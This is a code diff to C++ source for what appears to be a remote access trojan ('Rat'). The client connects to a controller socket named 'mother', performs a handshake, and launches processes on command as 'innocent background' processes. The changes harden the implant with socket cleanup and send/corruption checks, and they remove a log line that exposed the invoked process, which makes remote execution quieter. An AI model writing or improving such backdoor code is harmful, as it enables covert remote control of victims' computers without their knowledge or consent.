@@ -32,6 +32,7 @@ void Rat::Ping() {
             std::cerr << "[-] Socket creation failed.\n";
 
             ratState = RatState::PINGING;
+            closesocket(mother);
             std::this_thread::sleep_for(std::chrono::seconds(3));
 
             continue;
@@ -66,11 +67,13 @@ void Rat::Ping() {
 bool Rat::EstablishConnection() {
     std::cout << "[*] Attempting to Establish Connection. . ." << std::endl;
 
-    RatPacketUtils::Send(mother, RatPacket("imgettingratty", MsgType::INIT));
+    if (!RatPacketUtils::Send(mother, RatPacket("imgettingratty", MsgType::INIT))) {
+        std::cerr << "[-] Failed to send INIT Packet!" << std::endl;
+        return false;
+    }
 
     std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(mother);
-
-    if (recvPacket.second) {
+    if (recvPacket.second && !recvPacket.first.IsCorrupted()) {
         std::cout << "[*] Recv Challenge. . ." << std::endl;
 
         // recv challenge
@@ -78,11 +81,14 @@ bool Rat::EstablishConnection() {
 
         std::cout << "[*] Replying to Challenge. . ." << std::endl;
         // reply to it
-        RatPacketUtils::Send(mother, RatPacket(code, MsgType::INIT));
+        if (!RatPacketUtils::Send(mother, RatPacket(code, MsgType::INIT))) {
+            std::cerr << "[-] Failed to send Challenge Reply Packet!" << std::endl;
+            return false;
+        }
 
         // final ack of before possible estab
         recvPacket = RatPacketUtils::Recv(mother);
-        if (recvPacket.second) {
+        if (recvPacket.second && !recvPacket.first.IsCorrupted()) {
             std::cout << "[*] Recv Estab Ack. . ." << std::endl;
             return recvPacket.first.GetPacketMessage() == "ratty";
         }
@@ -108,7 +114,6 @@ void Rat::Listen() {
             }
         } else if (packet.GetType() == MsgType::INVOKE) {
             // create innocent background process
-            std::cerr << " |__init_proc: " << packet.GetPacketMessage() << std::endl;
             bool procCreated = UserProc::getInstance().CreateBackProc(
                 packet.GetPacketMessage()
             );
@@ -130,6 +135,7 @@ void Rat::Listen() {
             if (packet.GetPacketMessage() == "closed") {
                 std::cerr << "[-] Socket connection closed." << std::endl;
                 ratState = RatState::LOST;
+                closesocket(mother);
                 return;
             }
         } else {
@@ -138,5 +144,6 @@ void Rat::Listen() {
         }
     } else {
         ratState = RatState::LOST;
+        closesocket(mother);
     }
 }
